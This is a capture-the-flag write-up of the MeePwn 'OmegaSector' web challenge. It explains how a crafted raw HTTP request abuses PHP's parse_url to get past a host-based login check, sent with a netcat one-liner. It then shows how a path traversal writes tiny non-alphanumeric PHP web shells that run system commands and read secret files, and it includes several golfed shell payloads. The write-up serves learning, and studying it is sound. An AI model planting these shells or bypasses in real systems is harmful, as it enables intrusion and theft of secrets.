# OmegaSector &ndash; write-up by @terjanq

## Task Description
>Wtf !? I just want to go to OmegaSector but there is weird authentication here, please help me  
>http://138.68.228.12/

## Part1
The very first part of the challenge is about getting the source code of the [index.php] file. In the source of the website, we could find the URL `http://138.68.228.12/?is_debug=1` which exactly does that. 

The next step is to bypass the following countermeasures to gain the full control of the `$whoareyou` variable.

```php
$remote=$_SERVER['REQUEST_URI']; 

if(strpos(urldecode($remote),'..')) 
    mapl_die(); 

if(!parse_url($remote, PHP_URL_HOST))
    $remote='http://'.$_SERVER['REMOTE_ADDR'].$_SERVER['REQUEST_URI']; 

$whoareyou=parse_url($remote, PHP_URL_HOST); 
```

If we make any request by the web browser the `$_SERVER['REQUEST_URI']` variable will start with `/?` or `/index.php?` or `/index.php/` and so on. But there is always `slash` character at the beginning. So it's a tough task to get the custom hostname in here.  
At this stage, we can conclude that it is something with `raw HTTP requests`.  

Imagine the request below:
```
GET ..@alien.somewhere.meepwn.team/..//index.php?alien=%40!%23%24%40!%40%40 HTTP/1.1
Host: 138.68.228.12
Connection: close

```

In this payload I managed to cheat the `apache2`, the `parse_url` and the `strpos(urldecode($remote),'..')` at one shoot!

`Apache2` will move into a not existing directory `..@alien.somewhere.meepwn.team` then will go one level down `../` back to the `root` folder. It is important that there are two `slashes` otherwise it won't work. I suppose it is because it just cleverly removes `..@alien.somewhere.meepwn.team/../` from the file path. 

My first try after I discovered that we could travel over directories like that was to create `..://alien.somewhere.meepwn.team/../..//index.php` request so the `parse_url` evaluates to:

```
Array
(
    [scheme] => ..
    [host] => alien.somewhere.meepwn.team
    [path] => /../..//index.php
)
```

but injecting the `:` in the `directory name` caused the `apache2` to crash. Perhaps it is due to another solution which I will link to at the end of the write-up.

The `$_SERVER['REQUEST_URI']` variable has obviously `..@alien.somewhere.meepwn.team/..//index.php?alien=%40!%23%24%40!%40%40` value. 

Since `strpos(urldecode($remote),'..')` is `0` it evaluetes to `False` and thus the `mapl` won't `die`.

Also `parse_url($remote, PHP_URL_HOST)` won't return the hostname and the `http://127.0.0.1` will be prepended into `$remote` so the whole variable looks like `http://127.0.1..@alien.somewhere.meepwn.team/..//index.php?alien=%40!%23%24%40!%40%40`. 

Now `parse_url` returns

```
Array
(
    [scheme] => http
    [host] => alien.somewhere.meepwn.team
    [user] => 127.0.0.1..
    [path] => /..//index.php
    [query] => alien=%40!%23%24%40!%40%40
)
```

Bingo! We have a complete control over the `$whoareyou` variable.

We pass a few *ifs* 
```
if($whoareyou==="alien.somewhere.meepwn.team")
    ⋮
    if($_GET['alien']==='@!#$@!@@')
        ⋮
        $_SESSION['auth']=hash('sha256', 'alien'.$salt); 
            exit(header( "Location: alien_sector.php" )); 

```

and get redirected to another stage. 

I used this `bash script` in order to get the `PHPSESSID` with `auth` set
```bash
echo -ne 'GET ..@alien.somewhere.meepwn.team/..//index.php?alien=%40!%23%24%40!%40%40 HTTP/1.1\r\nHost: 138.68.228.12\r\nConnection: close\r\n\r\n' | nc 138.68.228.12 80
```
There are also similar *ifs* for `omega_sector.php` but actualy it had no any use in this challange. 

## Part2
After having the right `PHPSESSID` in the cookies we get the following form on the `alien_sector.php`:
```xml
<form action="alien_sector.php" method="POST">
<textarea class="shadow" id="main" name="message"></textarea>
<input type='text' name='type' value='alien' hidden />
<button type="submit" id="button"><div class="alien_language">Save</div></button>
</form>
```
If we send a message with `non alphanumeric characters` we see `Saved in alien_message/fc11ce87435398abd6a28dd622639988.alien`. In opposition on the `omega_sector` where we only can use `alphanumeric characters`. We can abuse the `type` attribute and we can send the request `type=/../super_secret_shell.php`.  
The serious restriction was that messages could be at most `40 characters` long.

At first, I thought that it is something like `race condition` that two scripts write into one file at the same time resulting in mixed content but it didn't work.

Then, inspired by some ideas found on the internet I have created the `reverse shell script` using only `non-alpha chars`: 
```php
<?=$_='$<>/'^'{{{{';${$_}[_](${$_}[__]);

// $_= '$<>/' ^ '{{{{' ----> $_ = '_GET'
// ${_GET}[_](${_GET})[__];
// final <?=$_GET[_]($_GET[__])
```

And then after visiting the URL `http://138.68.228.12/alien_message/super_secret_shell.php?_=system&__=rgrep MeePwn /var/www/` we see the flag: **MeePwnCTF{__133-221-333-123-111___}**


## Alternative solution
This is the solution posted by `P4Team`.

```
GET http://human.ludibrium.meepwn.team?human=Yes HTTP/1.0
Host: human.ludibrium.meepwn.team
```

This tricky payload takes an advantage of `default` in `virtual hosts` set to `/var/www/html` so any non-existent domain will point there. Also, it uses the alternative way of making the request using `GET FULL_URL` syntax. 

```php
<?=`/???/??? ../??????.??? > ===`
```

Even more tricky here using only 33 characters... It calls for shell via `` `...` `` syntax and then uses `shell wildcards` so `/???/???` will match `/bin/cat` and `../??????.???` matches `../secret.php`. Finally, it writes the result to `===` file. Amazing.




## Bonus
After the competition me and @Jelle.V.D golfed a little and managed to get much shorter payloads!

- 21 bytes (full shell via `?_=rgrep /var/www MeePwn`)
```php
<?=`{${~"����"}[_]}`;
// echo -ne '<?=`{${~"\xa0\xb8\xba\xab"}[_]}`;'
```
- 19 bytes (`cat` all files from `../`)
```php
<?=`/???/??? ../*`;
```









[index.php]:<./index.php>
